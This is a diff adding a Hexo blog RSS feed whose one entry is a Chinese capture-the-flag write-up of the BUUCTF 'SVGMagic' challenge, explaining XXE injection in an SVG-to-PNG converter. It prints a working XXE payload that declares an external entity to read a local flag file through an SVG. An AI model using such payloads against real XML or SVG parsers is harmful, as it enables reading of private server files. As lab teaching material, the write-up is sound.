@@ -1,0 +1,61 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;xxe漏洞&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Sun, 28 Jul 2024 23:18:59 +0800</pubDate>
+        <lastBuildDate>Sun, 28 Jul 2024 23:18:59 +0800</lastBuildDate>
+        <category>python</category>
+        <category>buuctf</category>
+        <category>system:file</category>
+        <category>文件内无字符rce</category>
+        <category>xxe漏洞</category>
+        <category>sql文件读取</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>文件上传</category>
+        <category>xml文件上传</category>
+        <category>php反序列化</category>
+        <category>regexp注入</category>
+        <category>buuctf， 反序列化</category>
+        <category>phar反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>php7 segment fault特性</category>
+        <category>zip加密</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/07/28/2019-SVGMagic/</guid>
+            <title>[BSidesCF2019]SVGMagic</title>
+            <link>http://odiws.github.io/2024/07/28/2019-SVGMagic/</link>
+            <category>buuctf</category>
+            <category>xxe漏洞</category>
+            <pubDate>Sun, 28 Jul 2024 23:18:59 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;bsidescf-2019svgmagic&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bsidescf-2019svgmagic&#34;&gt;#&lt;/a&gt; [BSidesCF 2019]SVGMagic&lt;/h2&gt;
+&lt;p&gt;标题说把 SVG 转为 PNG&lt;/p&gt;
+&lt;p&gt;SVG 是一种用 XML 定义的语言，SVG 图形是可交互的和动态的，可以在 SVG 文件中嵌入动画元素或通过脚本来定义动画。&lt;/p&gt;
+&lt;p&gt;也就是说这里的 SVG 是个 XML, 并且存在可控的内容，那么自然就会想到 XXE。&lt;/p&gt;
+&lt;p&gt;究极详细讲解：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzU0NTEuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/175451.html&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;我的理解是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;首先我们要知道，XML 被设计用来传输和存储数据。
+然后这个漏洞就是利用了，应用程序在解析XML输入时，没有禁止外部实体的加载。
+就拿下面的这个来说&amp;lt;!ENTITY file SYSTEM &amp;quot;file:///proc/self/cwd/flag.txt&amp;quot; &amp;gt;，这个就是外部实体，加载了flag.txt,然后输出，
+也就是：应该是实体引用，把加载的东西放出来
+&amp;lt;svg height=&amp;quot;100&amp;quot; width=&amp;quot;1000&amp;quot;&amp;gt;
+  &amp;lt;text x=&amp;quot;10&amp;quot; y=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;
+&amp;lt;/svg&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;!DOCTYPE note [
+&amp;lt;!ENTITY file SYSTEM &amp;quot;file:///proc/self/cwd/flag.txt&amp;quot; &amp;gt;
+]&amp;gt;
+&amp;lt;svg height=&amp;quot;100&amp;quot; width=&amp;quot;1000&amp;quot;&amp;gt;
+  &amp;lt;text x=&amp;quot;10&amp;quot; y=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;
+&amp;lt;/svg&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BBSidesCF2019%5DSVGMagic/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
